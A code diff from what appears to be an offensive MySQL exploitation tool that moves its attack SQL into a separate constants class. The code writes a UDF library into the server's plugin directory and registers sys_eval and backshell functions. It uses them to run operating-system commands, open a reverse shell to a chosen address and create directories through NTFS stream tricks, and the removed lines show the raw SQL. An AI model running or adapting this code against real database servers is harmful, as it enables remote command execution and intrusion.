@@ -16,6 +16,8 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
+import Util.MysqlSqlUtil;
+
 /**
  * @author ch1ng & j1anFen
  */
@@ -124,7 +126,7 @@ public class MysqlDao {
     public void getInfo() {
         try {
             // 1.sql语句
-            String sql = "select CONCAT_WS('~',version(), @@version_compile_os, @@version_compile_machine) as udfinfo;";
+            String sql = MysqlSqlUtil.getInfoSql;
 
             // 2.获取SQL执行者
             PreparedStatement st = CONN.prepareStatement(sql);
@@ -139,7 +141,8 @@ public class MysqlDao {
                 this.mysqlPlatform = udfinfo[1];
                 this.systemPlatform = udfinfo[2];
             }
-            String res = Utils.log(String.format("mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform, this.systemPlatform));
+            String res = Utils.log(String.format("Mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform,
+                    this.systemPlatform));
             mysqlController.mysqlLogTextArea.appendText(res);
             this.initUDF();
         } catch (SQLException ex) {
@@ -205,7 +208,7 @@ public class MysqlDao {
      */
     private void plugin_dir() throws SQLException {
 
-        String sql = "select @@plugin_dir as plugin_dir;";
+        String sql = MysqlSqlUtil.pluginDirSql;
         PreparedStatement st = CONN.prepareStatement(sql);
         ResultSet rs = st.executeQuery();
         while (rs.next()) {
@@ -240,7 +243,7 @@ public class MysqlDao {
             // 获取完整导出路径
             udfFullPath = remoteOutfile + randomPluginFile;
 
-            String sql = "select " + content + " into dumpfile '" + udfFullPath + "'";
+            String sql = String.format(MysqlSqlUtil.udfExportSql, content,udfFullPath);
 
             // 3.获取SQL执行者
             PreparedStatement st = CONN.prepareStatement(sql);
@@ -250,7 +253,7 @@ public class MysqlDao {
             mysqlController.mysqlLogTextArea.appendText(Utils.log("库文件写入成功"));
             //PublicUtil.log("插件UDF写入成功");
 
-            String sqlEval = "create function " + funcEvil + " returns string soname '" + randomPluginFile + "';";
+            String sqlEval = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
             //System.out.println(sqlEval);
             PreparedStatement st1 = CONN.prepareStatement(sqlEval);
             st1.execute();
@@ -271,7 +274,7 @@ public class MysqlDao {
      */
     public String eval(String command, String code) {
         try {
-            String sql = "select sys_eval('" + command + "') as s;";
+            String sql = String.format(MysqlSqlUtil.evalSql, command);
             PreparedStatement st = CONN.prepareStatement(sql);
             ResultSet rs = st.executeQuery();
             while (rs.next()) {
@@ -298,7 +301,7 @@ public class MysqlDao {
      */
     public String backShell(String reverseAddress, int port, String code) {
         try {
-            String sql = "select backshell('" + reverseAddress + "', " + port + ") as s;";
+            String sql = String.format(MysqlSqlUtil.reverseShellSql, reverseAddress, port);
             PreparedStatement st = CONN.prepareStatement(sql);
             ResultSet rs = st.executeQuery();
             while (rs.next()) {
@@ -319,7 +322,7 @@ public class MysqlDao {
      */
     public void ntfsdir() {
         try {
-            String sql = "select '1'" + "into dumpfile '" + remoteOutfile.substring(0, remoteOutfile.length() - 1) + "::$INDEX_ALLOCATION'";
+            String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
             PreparedStatement st = CONN.prepareStatement(sql);
             st.execute();
             mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功"));
@@ -352,11 +355,11 @@ public class MysqlDao {
 
     public void removeEvilFunc() {
         try {
-            String cleanSql = "drop function if exists sys_eval;";
+            String cleanSql = MysqlSqlUtil.cleanSql;
             PreparedStatement st1 = CONN.prepareStatement(cleanSql);
             st1.execute();
 
-            String cleanSql1 = "drop function if exists backshell;";
+            String cleanSql1 = MysqlSqlUtil.cleanSql2;
             PreparedStatement st2 = CONN.prepareStatement(cleanSql1);
             st2.execute();
         } catch (Exception e) {
@@ -373,9 +376,7 @@ public class MysqlDao {
         String rmplugin = null;
 
         try {
-            // 删除恶意函数
-            this.removeEvilFunc();
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
+            mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
             String tempPath = remoteOutfile + "*.temp";
             if (mysqlPlatform.startsWith("Win")) {
                 rmplugin = "del /f " + tempPath;
@@ -383,7 +384,10 @@ public class MysqlDao {
                 rmplugin = "rm -f " + tempPath;
             }
             eval(rmplugin, "UTF-8");
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
+            mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
+            // 删除恶意函数
+            this.removeEvilFunc();
+
 //            if(tempFiles.size() > 0) {
 //                Iterator<String> it = tempFiles.iterator();
 //                while (it.hasNext()) {
